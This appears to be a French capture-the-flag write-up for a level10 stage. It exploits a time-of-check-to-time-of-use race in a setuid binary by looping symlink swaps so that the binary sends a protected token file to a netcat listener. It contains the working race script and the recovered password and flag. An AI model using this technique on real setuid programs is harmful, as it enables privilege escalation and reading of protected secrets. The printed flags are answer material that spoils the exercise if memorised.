## Démarche
- Dans le home :
  
  `ls -la`
  > -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
  > 
  > -rw-------  1 flag10  flag10     26 Mar  5  2016 token

- À l'exécution : `./level10`
    > ./level10 file host
	  >
    > sends file to host if you have access to it

- Décortiquer le fonctionnement du binaire :
  
  - `strings level10`
    > Connecting to %s:6969 ..
  - `nm -u level10`
    ```
      w _Jv_RegisterClasses
      U __errno_location@@GLIBC_2.0
      w __gmon_start__
      U __libc_start_main@@GLIBC_2.0
      U __stack_chk_fail@@GLIBC_2.4
      U access@@GLIBC_2.0
      U connect@@GLIBC_2.0
      U exit@@GLIBC_2.0
      U fflush@@GLIBC_2.0
      U htons@@GLIBC_2.0
      U inet_addr@@GLIBC_2.0
      U open@@GLIBC_2.0
      U printf@@GLIBC_2.0
      U puts@@GLIBC_2.0
      U read@@GLIBC_2.0
      U socket@@GLIBC_2.0
      U strerror@@GLIBC_2.0
      U write@@GLIBC_2.0
    ```

- Le manual de la fonction access mentionne une faille TOCTOU :
  `man access`
  > Warning: Using access() to  check  if  a  user  is
       authorized  to,  for  example,  open a file before
       actually doing so using open(2) creates a security
       hole,  because  **the  user  might exploit the short
       time interval between  checking  and  opening  the
       file  to  manipulate it.**  For this reason, the use
       of this system call should be  avoided.   (In  the
       example  just described, a safer alternative would
       be to temporarily switch the  process's  effective
       user ID to the real ID and then call open(2).)

  > A malicious user could substitute a file he has access to for a symlink to something he doesn't have access to between the access() and the open() calls.


- Utiliser un script pour exploiter cette faille :
  *On créé un lien vers un fichier dont les droits d'accès sont ouverts et change le lien vers le fichier token que l'on souhaite lire entre la vérification d'`access` et son ouverture*
  ```
      touch x
      while true; do
        ln -sf ./x fake & 
        ~/level10 fake 127.0.0.1 & 
        ln -sf /home/user/level10/token fake &
      done
  ```

- Transférer et lancer le script sur la VM :
  
  `scp -P 4242 level10/ressources/script.sh level10@192.168.0.17:/tmp`

  *Dans la VM :*
  `sh script.sh`

- En parallèle, écouter le port 6969 : 
  `nc -l 6969`
  > .*( )*.
  > 
  > woupa2yuojeeaaed06riuj63c

- Se connecter avec `su flag10`:`woupa2yuojeeaaed06riuj63c`
- Récupérer le flag :
  `getflag`
  > Check flag.Here is your token : feulo4b72j7edeahuete3no7c

## Ressources
- [Testing Permission to Access a File](https://www.gnu.org/software/libc/manual/html_node/Testing-File-Access.html)
- [Time of check to time of use (TOCTOU): A race condition](https://hackernoon.com/time-of-check-to-time-of-use-toctou-a-race-condition-99c2311bd9fc)